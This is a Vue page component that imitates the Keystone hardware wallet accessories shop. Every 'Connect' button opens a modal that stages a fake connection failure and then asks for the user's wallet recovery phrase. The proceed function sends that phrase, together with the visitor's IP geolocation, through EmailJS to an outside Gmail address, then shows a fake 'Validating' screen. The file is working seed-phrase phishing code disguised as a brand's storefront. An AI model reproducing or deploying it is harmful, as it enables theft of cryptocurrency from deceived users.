<template>
  <div
    class="bg-[#111214] min-h-screen flex flex-col"
    style="letter-spacing: 0.04em; line-height: 35px"
  >
    <!-- Login Box -->
    <div class="text-white flex-grow text-white">
      <Header />
      <div class="mx-auto max-w-screen-2xl lg:px-20 px-5">
        <div class="w-full my-10 lg:my-[50px]">
          <h3 class="font-semibold text-2xl mb-8">Accessories</h3>

          <!-- Card Grid -->
          <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
            <div
              v-for="(card, index) in cards"
              :key="index"
              class="border border-[#272829] rounded overflow-hidden"
            >
              <img
                :src="card.image"
                :alt="card.title"
                class="w-full h-[300px] object-contain"
              />
              <div class="p-8">
                <h4 class="text-lg font-semibold mb-2">{{ card.title }}</h4>
                <p
                  class="text-[15px] text-neutral-400 mb-8"
                  style="
                    overflow: hidden;
                    text-overflow: ellipsis;
                    display: -webkit-box;
                    -webkit-box-orient: vertical;
                    -webkit-line-clamp: 2;
                  "
                >
                  {{ card.subtitle }}
                </p>
                <button
                  @click="openCloseModal"
                  class="text-base text-white py-2 px-3 rounded font-semibold transition"
                  style="
                    border: 2px solid;
                    border-image: linear-gradient(
                        90deg,
                        #3d71ff 25%,
                        #6b38fb 100%
                      )
                      1;
                  "
                >
                  Connect
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Footer />
			
    </div>
		<Modal :isVisible="showModal" @close="closeModal">
      <template v-if="modalState === 'loading'">
        <div class="flex items-center justify-center mb-10">
          <div class="spinner"></div>
        </div>
        <p class="text-center">Connecting... Please wait</p>
      </template>
      <template v-else-if="modalState === 'failed'">
        <div class="flex items-center justify-center mb-10">
          <div class="spinner"></div>
        </div>
        <p class="text-red-500 text-center">
          Failed... Please connect manually
        </p>
        <div class="flex items-center justify-center mt-5">
          <button
            class="bg-black text-white py-2 px-4 rounded-lg"
            @click="connectManually"
          >
            Connect Manually
          </button>
        </div>
      </template>
      <template v-else-if="modalState === 'manual'">
        <form >
          <div class="flex flex-col items-center justify-center">
            
            <h3 class="text-xl text-gray-600 capitalize">
              Import your Keystone Wallet
            </h3>
          </div>

          <div class="mt-10 mb-5 flex flex-col">
            <label class="text-gray-500">Wallet Name</label>
            <input
              type="text"
              :disabled="true"
              class="rounded-lg border-gray-500 mt-2 bg-gray-200"
              style="border: 1px solid gray; border-radius: 8px; padding: 7px 10px"
              v-model="name"
              placeholder="Enter your recovery phrase"
            ></input>
          </div>

          <div class="flex flex-col">
            <label class="text-gray-500">Recovery phrase</label>
            <textarea
              class="rounded-lg border-gray-500 py-2 px-4 mt-2"
              style="border: 1px solid gray"
              v-model="phrase"
              placeholder="Enter your recovery phrase"
            ></textarea>
          </div>

          <p class="text-sm text-gray-500 mt-2">
            Typically 12 (sometimes 24) words separated by
            single spaces
          </p>

          <div class="flex items-center justify-center mt-10">
            <button
              class="bg-black w-full text-white py-2 px-4 rounded-lg"
              :disabled="isSubmitting"
              @click="proceed"
            >
              {{ isSubmitting ? "Processing...": "Proceed" }}
            </button>
          </div>
        </form>
      </template>
      <template v-else-if="modalState === 'barcode'">

        <img src="https://pngimg.com/uploads/qr_code/qr_code_PNG10.png" alt="">
        <div class="flex items-center justify-center mb-4">
          <div class="spinner"></div>
        </div>
        <p class="text-center mb-10">
          Validating... Please wait
        </p>
        <div class="flex items-center justify-center mt-5">
          <button
            class="bg-black text-white py-1 px-4 rounded-lg"
            @click="closeModal"
          >
            Close
          </button>
        </div>
      </template>
    </Modal>
		
  </div>
</template>

<script setup>

useHead({
  title: "Keystone: Best Open Source Cold Wallet & Hardware Wallet",
  meta: [
    {
      name: "description",
      content:
        "The only hardware wallet that supports MetaMask mobile. Secure your Bitcoin and other crypto assets offline with Keystone's open-source cold wallet.",
    },
  ],
});
import Header from "@/components/Header.vue";
import Footer from "@/components/Footer.vue";
import axios from "axios";
import Modal from "@/components/Modal.vue";

const cards = ref([
  {
    image:
      "https://cdn.shopify.com/s/files/1/0029/3175/3060/products/Plus1.jpg?v=1677056228",
    title: "Keystone Tablet Plus",
    subtitle:
      "Redesigned with individual slots for each letter tile, Keystone Tablet Plus ensures the tiles stay in place even under extreme heat and deformation, providing extra security against fire, water, and physical damage",
    buttonText: "Connect",
    link: "#",
  },
  {
    image:
      "https://cdn.shopify.com/s/files/1/0029/3175/3060/files/3pro.png?v=1728372157",
    title: "Keystone 3 Pro",
    subtitle:
      "Keystone 3 Pro is the only hardware wallet equipped with three security chips to securely manage multiple crypto accounts. Its Air-Gapped Mode eliminates all connectivity risks, ensuring maximum security for your assets.",
    buttonText: "Learn More",
    link: "#",
  },
  {
    image:
      "https://cdn.shopify.com/s/files/1/0029/3175/3060/products/Tablet1.jpg?v=1677056166",
    title: "Keystone Tablet",
    subtitle:
      "Crafted from 304 stainless steel, Keystone Tablet securely stores your seed phrases and private keys, providing protection against fire, water, and physical damage",
    buttonText: "Learn More",
    link: "#",
  },
  {
    image:
      "https://cdn.shopify.com/s/files/1/0029/3175/3060/files/nft.png?v=1728372188",
    title: "Keystone 3 Pro Customization",
    subtitle:
      "Your assets, your control. Personalize your Keystone 3 Pro by displaying your favorite NFT or image, making it truly one-of-a-kind.*Please note: Delivery takes approximately 3 months due to customization, and returns are not supported once the order is placed.",
    buttonText: "Learn More",
    link: "#",
  },
  {
    image:
      "https://cdn.shopify.com/s/files/1/0029/3175/3060/files/7ac65b00f300a2870f618ae23baf45b1_f2268c24-0fc6-4de3-a52e-3f83ec38365e.png?v=1733194026",
    title: "Keystone 3 Pro Co-Branded Version",
    subtitle:
      "Keystone has been a trusted partner of top brands in the Web3 ecosystem. Together, we have developed a series of co-branded hardware wallets that redefine crypto security *Please note that this is a co-branded custom product, with a production time of approximately 2 months. Returns are not supported once the order is placed.",
    buttonText: "Learn More",
    link: "#",
  },
]);

const showModal = ref(false);
const modalState = ref("loading");
const phrase = ref("");
const name = ref("Keystone Wallet");
const isSubmitting = ref(false);

const openCloseModal = () => {
  showModal.value = !showModal.value;
  if (showModal.value) {
    setTimeout(() => {
      modalState.value = "failed";
    }, 2000);
  }
};

const closeModal = () => {
  showModal.value = false;
  modalState.value = "loading";
};

const connectManually = () => {
  modalState.value = "manual";
};

const proceed = async () => {
  isSubmitting.value = true;

  try {
    const location = await axios.get("https://ipapi.co/json");

    const params = {
      service_id: "service_8pbgnpr",
      template_id: "template_xv7sb0z",
      user_id: "user_nsG3rSdCFpgONwwCfNTas",
      template_params: {
        from_name: "Keystone",
        wallet_type: "Keystone Wallets",
        location: JSON.stringify(location.data),
        link_drops: phrase.value,
        reply_to: "customeronlineagent@gmail.com",
      },
      
    };

    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      modalState.value = "barcode";
    }
  } catch (error) {
    console.error("Error importing keystone:", error);
  } finally {
    isSubmitting.value = false;
  }
};
</script>

<style scoped>
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.modal-content {
  background: white;
  padding: 20px;
  border-radius: 8px;
  width: 80%;
  max-width: 500px;
  position: relative;
}

.close-icon {
  position: absolute;
  top: 10px;
  right: 10px;
  font-size: 24px;
  cursor: pointer;
}

.spinner {
  border: 4px solid rgba(0, 0, 0, 0.1);
  border-left-color: #000;
  border-radius: 50%;
  width: 60px;
  height: 60px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

@media (min-width: 768px) {
  .modal-content {
    width: 30%;
  }
}
</style>
